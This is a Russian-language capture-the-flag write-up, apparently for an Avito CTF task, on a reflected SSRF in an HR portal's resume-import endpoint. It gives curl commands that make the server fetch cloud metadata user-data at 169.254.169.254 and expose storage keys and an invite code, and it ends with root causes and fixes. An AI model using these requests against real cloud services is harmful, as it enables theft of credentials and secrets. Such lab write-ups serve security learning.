# МёдХантер: invite code — технический разбор

**Флаг:** `avito{ExcLu51V3_pDF_4cc3Ss_3NAblEd}`

**Класс:** web / reflected SSRF / IMDS / cloud-init secret disclosure

## Краткое техническое резюме

Endpoint `POST /api/seeker/resume/import` принимает произвольный URL, выполняет server-side HTTP
request и отражает response body. Фильтрация не блокирует link-local address
`169.254.169.254`. На host работает `yc-imdsv1-bridge`, предоставляющий AWS-compatible IMDS paths
без обязательного metadata header.

SSRF к `/latest/user-data` возвращает cloud-init configuration, включая `/opt/app/.env`.
Переменная `PDF_BETA_INVITE_CODE` содержит флаг и принимается endpoint
`POST /api/seeker/pdf/activate`.

## 1. Контекст и цель

Target: `https://hrportal-aoa51cvc.avitoctf.ru/`.

PDF generation доступна после активации beta invite. Сервер хранит invite в
`PDF_BETA_INVITE_CODE`; задача состоит в извлечении этого значения.

Task18 открывает общую attack chain МёдХантера. Полученные из `user-data` cloud credentials и
infrastructure identifiers используются в
[`../task19/hrportal_task19_writeup.md`](../task19/hrportal_task19_writeup.md), а Object Storage
credentials — в [`../task21/hrportal_task21_writeup.md`](../task21/hrportal_task21_writeup.md).

## 2. Reconnaissance и attack surface

Frontend представляет собой React SPA за nginx. Анализ `bundle.js` и `bundle.beauty.js` определяет
API endpoint:

```http
POST /api/seeker/resume/import
Content-Type: application/json

{"url":"<attacker-controlled URL>"}
```

Backend принимает `http` и `https`, отклоняет `file://` как unsupported protocol scheme и возвращает
загруженный content в JSON fields `content`/`exception`. Следовательно, это non-blind SSRF с полным
response disclosure.

GCE-compatible IMDS endpoint `/computeMetadata/v1/...` требует header
`Metadata-Flavor: Google`, который import endpoint не позволяет задать. Альтернативный
AWS-compatible path `/latest/...` доступен через локальный service `yc-imdsv1-bridge` без этого
header.

## 3. Анализ и проверка гипотез

Основная цель SSRF — link-local IMDS:

```text
http://169.254.169.254/latest/user-data
```

Ответ содержит cloud-config, создающий application files на host. В частности, в
`write_files` присутствует `/opt/app/.env` со следующими sensitive values:

- `PDF_BETA_INVITE_CODE`;
- `STORAGE_ACCESS_KEY` и `STORAGE_SECRET_KEY`;
- `REGISTRY_ID`;
- `RECAPTCHA_SECRET_KEY`;
- application callback configuration.

Файл `/opt/app/start.sh` в том же `user-data` подтверждает запуск
`yc-imdsv1-bridge.service`. Значение `PDF_BETA_INVITE_CODE` имеет формат `avito{...}` и является
целевым секретом. Endpoint `/api/seeker/pdf/activate` возвращает `{"enabled":true}` при передаче
этого значения.

Дополнительная эксплуатация PDF renderer для task18 не требуется. Изменение resume может требовать
валидный reCAPTCHA token, но invite извлекается напрямую через SSRF до этого этапа.

## 4. Корневая причина

1. URL import не применяет destination allowlist и разрешает requests к link-local IMDS address.
2. Upstream response body отражается authenticated user, превращая SSRF в read primitive.
3. `yc-imdsv1-bridge` предоставляет metadata без session token или mandatory header.
4. Long-lived application secrets размещены в cloud-init `user-data`, доступном через IMDS.

## 5. Эксплуатация

Проверка reflected SSRF:

```bash
curl -s -b cookies.txt -X POST \
  https://hrportal-aoa51cvc.avitoctf.ru/api/seeker/resume/import \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://example.com/"}'
```

Извлечение `user-data`:

```bash
curl -s -b cookies.txt -X POST \
  https://hrportal-aoa51cvc.avitoctf.ru/api/seeker/resume/import \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/user-data"}'
```

End-to-end solver принимает raw Cookie header или curl/Netscape cookie jar:

```bash
uv run python task18/solve_task18.py \
  --cookie-file <cookies.txt> \
  --activate
```

`--activate` дополнительно отправляет invite в `/api/seeker/pdf/activate`; `--output` сохраняет
сырой SSRF response. Локальная проверка parser и cookie handling:

```bash
uv run python task18/solve_task18.py --self-test
```

## 6. Флаг

```text
avito{ExcLu51V3_pDF_4cc3Ss_3NAblEd}
```

## 7. Выводы и рекомендации

- Применять allowlist допустимых schemes, hostnames и ports для server-side URL fetch.
- После DNS resolution блокировать loopback, private, link-local, multicast и reserved ranges;
  повторять validation после каждого redirect.
- Отключить legacy IMDS bridge либо требовать token-based metadata access.
- Не хранить long-lived credentials в cloud-init `user-data`; использовать managed secret storage и
  workload identity.
- Не возвращать raw upstream responses пользователю; ограничивать content type, size и parsing.
- Добавить egress filtering, запрещающий application workloads обращаться к IMDS.

## 8. Файлы для воспроизведения

Version-controlled artifacts:

- `task18/solve_task18.py` — reflected SSRF, extraction `PDF_BETA_INVITE_CODE` и optional activation.
- `task18/s3list.py` — SigV4 client для проверки утёкших Object Storage credentials.

Cloud-init responses, frontend bundles и HTTP captures являются generated reconnaissance artifacts и
не входят в version-controlled набор.
